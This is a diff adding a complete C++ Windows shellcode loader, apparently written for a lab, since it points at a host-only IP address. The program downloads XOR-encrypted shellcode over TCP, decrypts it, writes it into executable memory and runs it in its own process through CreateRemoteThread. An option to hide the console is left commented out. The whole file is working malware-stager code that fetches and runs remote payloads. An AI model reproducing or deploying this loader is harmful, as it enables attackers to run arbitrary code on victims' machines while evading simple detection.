@@ -1,0 +1,130 @@
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iostream>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+struct Shellcode {
+    BYTE* pcData;
+    DWORD dwSize;
+};
+
+BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode);
+void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key);
+DWORD RunShellcodeInSelf(Shellcode shellcode);
+
+int main() {
+    // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+    Shellcode shellcode;
+    std::cout << "Connecting to shellcode server..." << std::endl;
+    if (!DownloadShellcodeViaTCP("192.168.56.1", 8000, &shellcode)) {
+        std::cout << "Failed to download shellcode." << std::endl;
+        system("pause");
+        return 2;
+    }
+
+    std::cout << "Downloaded encrypted shellcode size: " << shellcode.dwSize << " bytes" << std::endl;
+
+    std::cout << "First 10 bytes before decrypt: ";
+    for (int i = 0; i < 10; ++i) std::cout << std::hex << (int)shellcode.pcData[i] << " ";
+    std::cout << std::endl;
+    XorDecrypt(shellcode.pcData, shellcode.dwSize, 0xAA);
+    std::cout << "First 10 bytes after decrypt: ";
+    for (int i = 0; i < 10; ++i) std::cout << std::hex << (int)shellcode.pcData[i] << " ";
+    std::cout << std::endl;
+
+    std::cout << "Executing shellcode in-process..." << std::endl;
+    DWORD exitCode = RunShellcodeInSelf(shellcode);
+    std::cout << "Shellcode thread exited with code: " << exitCode << std::endl;
+    system("pause");
+    return 0;
+}
+
+BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return FALSE;
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return FALSE;
+    }
+    std::cout << "created socket" << std::endl;
+
+    sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    inet_pton(AF_INET, host, &server.sin_addr);
+
+    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return FALSE;
+    }
+    std::cout << "Connected." << std::endl;
+
+    DWORD capacity = 4096;
+    BYTE* buffer = (BYTE*)malloc(capacity);
+    DWORD totalSize = 0;
+
+    while (true) {
+        int bytesRead = recv(sock, (char*)(buffer + totalSize), capacity - totalSize, 0);
+        if (bytesRead <= 0) break;
+        totalSize += bytesRead;
+        if (capacity - totalSize < 1024) {
+            capacity *= 2;
+            buffer = (BYTE*)realloc(buffer, capacity);
+        }
+    }
+
+    std::cout << "finished reading shellcode" << std::endl;
+
+    closesocket(sock);
+    WSACleanup();
+
+    shellcode->pcData = buffer;
+    shellcode->dwSize = totalSize;
+    return TRUE;
+}
+
+DWORD RunShellcodeInSelf(Shellcode shellcode) {
+    std::cout << "Entered RunShellcodeInSelf" << std::endl;
+    HANDLE hProcess = GetCurrentProcess(); // self inject 
+    LPVOID mem = VirtualAllocEx(hProcess, nullptr, shellcode.dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) {
+        std::cout << "VirtualAllocEx failed" << std::endl;
+        return -1;
+    }
+
+    std::cout << "Memory allocated in current process, writing shellcode..." << std::endl;
+    SIZE_T written;
+    if (!WriteProcessMemory(hProcess, mem, shellcode.pcData, shellcode.dwSize, &written)) {
+        std::cout << "WriteProcessMemory failed" << std::endl;
+        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
+        return -2;
+    }
+
+    std::cout << "Shellcode written, creating remote thread..." << std::endl;
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
+    if (!hThread) {
+        std::cout << "CreateRemoteThread failed" << std::endl;
+        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
+        return -3;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    DWORD exitCode;
+    GetExitCodeThread(hThread, &exitCode);
+    std::cout << "Shellcode thread completed with exit code: " << exitCode << std::endl;
+    CloseHandle(hThread);
+    return exitCode;
+}
+
+void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key) {
+    for (DWORD i = 0; i < dataLen; ++i) {
+        data[i] ^= key;
+    }
+}
